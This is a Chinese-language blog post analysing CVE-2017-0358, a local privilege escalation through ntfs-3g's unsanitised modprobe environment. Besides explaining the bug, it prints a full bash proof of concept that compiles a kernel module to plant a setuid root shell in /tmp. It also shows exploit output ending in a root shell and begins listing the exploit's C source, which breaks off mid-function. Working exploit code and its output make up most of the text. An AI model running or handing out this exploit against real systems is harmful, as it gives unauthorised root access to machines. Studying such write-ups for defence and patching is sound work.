<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="CVE Binary PWN hacker web security angr rex ida hack code python github hexo"><title>CVE-2017-0358 | Mr.Ma3k4H3d</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2017-0358</h1><a id="logo" href="/.">Mr.Ma3k4H3d</a><p class="description">竹杖芒鞋轻胜马，一蓑烟雨任平生。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="https://micro8.github.io/Micro8-HTML/"><i class="fa fa-archive"> Micro8</i></a><a href="https://ma3k4h3d.top/Papers/"><i class="fa fa-archive"> Papers</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/history/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2017-0358</h1><div class="post-meta">Oct 21, 2018<span> | </span><span class="category"><a href="/categories/漏洞分析/">漏洞分析</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 13</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><p>CVE-2017-0358，Linux本地提权漏洞。<br><a id="more"></a></p>
<h2 id="0x00-ntfs-3g-Debian-9-Privilege-Escalation"><a href="#0x00-ntfs-3g-Debian-9-Privilege-Escalation" class="headerlink" title="0x00 ntfs-3g (Debian 9) - Privilege Escalation"></a>0x00 ntfs-3g (Debian 9) - Privilege Escalation</h2><hr>
<p>　　最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞<a href="https://www.exploit-db.com/exploits/41240/" target="_blank" rel="noopener">ntfs-3g (Debian 9) - Privilege Escalation</a>，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。<br>EXP如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  ntfs-3g local privilege escalation to root     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Credits to Google Project Zero                 @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Tested: Debian 9 (Stretch)                     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Date: 2017-02-03                               @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Link: https://goo.gl/A9I8Vq                    @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Gathering environment info ..."</span></span><br><span class="line">cwd=<span class="string">"<span class="variable">$(pwd)</span>"</span></span><br><span class="line">un=<span class="string">"<span class="variable">$(uname -r)</span>"</span></span><br><span class="line">dlm=<span class="string">"<span class="variable">$(pwd)</span>/lib/modules"</span></span><br><span class="line">dkf=<span class="string">"<span class="variable">$(pwd)</span>/kernel/fs"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Creating kernel hijack directories ..."</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dlm&#125;</span>"</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dkf&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Forging symlinks ..."</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dlm&#125;</span>/<span class="variable">$&#123;un&#125;</span>"</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dkf&#125;</span>/fuse"</span></span><br><span class="line">ln -sf cve_2017_0358.ko fuse.ko</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Pulling in deps ... "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Building kernel module ... "</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; cve_2017_0358.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"CC"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"PoC for CVE-2017-0358 from Google Project Zero"</span>);</span><br><span class="line"></span><br><span class="line">int init_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n"</span>);</span><br><span class="line">  char *envp[] = &#123; <span class="string">"HOME=/tmp"</span>, NULL &#125;;</span><br><span class="line">  char *argv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  char *argvv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/sbin/rmmod cve_2017_0358"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void cleanup_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[*] CVE-2017-0358 exploit unloading ...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; Makefile</span><br><span class="line">obj-m += cve_2017_0358.o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">make 1&gt;/dev/null 2&gt;/dev/null || <span class="built_in">echo</span> <span class="string">"[-] FAILED: your need make / build tools"</span></span><br><span class="line">cp <span class="string">"/lib/modules/<span class="variable">$&#123;un&#125;</span>/modules.dep.bin"</span> . || <span class="built_in">echo</span> <span class="string">"[-] FAILED: linux-image location non-default?"</span></span><br><span class="line">MODPROBE_OPTIONS=<span class="string">"-v -d <span class="variable">$&#123;cwd&#125;</span>"</span> ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null</span><br><span class="line">/tmp/r00t -c <span class="string">'whoami'</span> | egrep -q <span class="string">'root'</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">"[+] SUCCESS: You have root. Don't be evil :)"</span></span><br><span class="line">/tmp/r00t</span><br></pre></td></tr></table></figure>
<p>　　疑惑的是无论如何测试，始终不成功，最后怀疑是<code>modprobe</code>函数的问题，查看<a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/sec-Setting_Module_Parameters.html" target="_blank" rel="noopener">官方文档</a>，给出如下解释：</p>
<blockquote>
<p><strong>The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded.</strong></p>
</blockquote>
<p> 　　也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：<strong>“need additional modification，you have to make me an offer”</strong>,shit…</p>
<p>（注：jannh已在<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>上发布有效版本，<a href="https://www.exploit-db.com/exploits/41356/" target="_blank" rel="noopener">ntfs-3g - Unsanitized modprobe Environment Privilege Escalation</a>）</p>
<h2 id="0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment"><a href="#0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment" class="headerlink" title="0x01 ntfs-3g: modprobe is executed with unsanitized environment"></a>0x01 ntfs-3g: modprobe is executed with unsanitized environment</h2><hr>
<p>　　在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1072" target="_blank" rel="noopener">(ntfs-3g: modprobe is executed with unsanitized environment)</a>。</p>
<p>　　漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用<code>modprobe</code>时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于<code>load_fuse_module ()</code>函数之中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">load_fuse_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="keyword">pid_t</span> pid;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;   <span class="comment">/* 100 msec */</span></span><br><span class="line">   fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">       pid = fork();</span><br><span class="line">       <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">           execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">           _exit(<span class="number">1</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">           waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * We sleep first because despite the detection of the loaded</span></span><br><span class="line"><span class="comment">        * FUSE kernel module, fuse_mount() can still fail if it's not</span></span><br><span class="line"><span class="comment">        * fully functional/initialized. Note, of course this is still</span></span><br><span class="line"><span class="comment">        * unreliable but usually helps.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       nanosleep(&amp;req, <span class="literal">NULL</span>);</span><br><span class="line">       fstype = get_fuse_fstype();</span><br><span class="line">       <span class="keyword">if</span> (fstype != FSTYPE_NONE)</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 　　当NTFS-3G被调用时，利用<code>get_fuse_fstype()</code>检测当前系统是否加载FUSE模块，若未加载，则利用<code>load_fuse_module()</code>中的<code>modprobe</code>，加载FUSE模块。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">get_fuse_fstype</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fuse_fstype fstype = FSTYPE_NONE;</span><br><span class="line"></span><br><span class="line">    FILE *f = fopen(<span class="string">"/proc/filesystems"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        ntfs_log_perror(<span class="string">"Failed to open /proc/filesystems"</span>);</span><br><span class="line">        <span class="keyword">return</span> FSTYPE_UNKNOWN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), f)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuseblk\n"</span>)) &#123;</span><br><span class="line">            fstype = FSTYPE_FUSEBLK;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuse\n"</span>))</span><br><span class="line">            fstype = FSTYPE_FUSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　问题在于，<code>modprobe</code>的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在<code>modprobe</code>的man文档中明确指出：</p>
<blockquote>
<p><strong>The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe.</strong></p>
</blockquote>
<p>　　因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量<strong>MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”</strong>，强制<code>modprobe</code>加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。</p>
<p>　　在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在<code>fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)</code>时异常，导致<code>get_fuse_fstype()</code>返回<strong>FSTYPE_UNKNOWN</strong>，在主函数中触发<code>load_fuse_module()</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fstype = get_fuse_fstype();</span><br><span class="line"></span><br><span class="line">err = NTFS_VOLUME_NO_PRIVILEGE;</span><br><span class="line"><span class="keyword">if</span> (restore_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN)</span><br><span class="line">    fstype = load_fuse_module();</span><br><span class="line">create_dev_fuse();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drop_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-Attack"><a href="#0x02-Attack" class="headerlink" title="0x02 Attack"></a>0x02 Attack</h2><p>　　jannh给出了<a href="https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/41356.zip" target="_blank" rel="noopener">EXP</a>，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.tar</span><br><span class="line"></span><br><span class="line">user@ubuntu:~$ <span class="built_in">cd</span> ntfs-3g-modprobe-unsafe/</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.sh</span><br><span class="line"></span><br><span class="line">make: Entering directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">  CC [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.o</span><br><span class="line"></span><br><span class="line">  Building modules, stage 2.</span><br><span class="line"></span><br><span class="line">  MODPOST 1 modules</span><br><span class="line"></span><br><span class="line">  CC      /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o</span><br><span class="line"></span><br><span class="line">  LD [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.ko</span><br><span class="line"></span><br><span class="line">make: Leaving directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directory</span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directory</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploit</span><br><span class="line"></span><br><span class="line">looks like we won the race</span><br><span class="line"></span><br><span class="line">got ENFILE at 198088 total</span><br><span class="line"></span><br><span class="line">Failed to open /proc/filesystems: Too many open files <span class="keyword">in</span> system</span><br><span class="line"></span><br><span class="line">  yay, modprobe ran!</span><br><span class="line"></span><br><span class="line">modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open <span class="built_in">builtin</span> file <span class="string">'/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'</span></span><br><span class="line"></span><br><span class="line">modprobe: ERROR: could not insert <span class="string">'rootmod'</span>: Too many levels of symbolic links</span><br><span class="line"></span><br><span class="line">Error opening <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">Failed to mount <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/ntfs-3g-modprobe-unsafe<span class="comment"># id</span></span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user)</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Code-Exploit-c"><a href="#0x03-Code-Exploit-c" class="headerlink" title="0x03 Code: Exploit.c"></a>0x03 Code: Exploit.c</h2><hr>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* prevent shell from backgrounding ntfs-3g when stopped */</span></span><br><span class="line"><span class="keyword">pid_t</span> initial_fork_child = fork();</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"initial fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (waitpid(initial_fork_child, &amp;status, <span class="number">0</span>) != initial_fork_child)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"waitpid"</span>);</span><br><span class="line">    execl(<span class="string">"rootshell"</span>, <span class="string">"rootshell"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// Set up workspace with volume, mountpoint, modprobe config and module directory.</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">template</span>[] = <span class="string">"/tmp/ntfs_sploit.XXXXXX"</span>;</span><br><span class="line"><span class="keyword">if</span> (mkdtemp(<span class="keyword">template</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    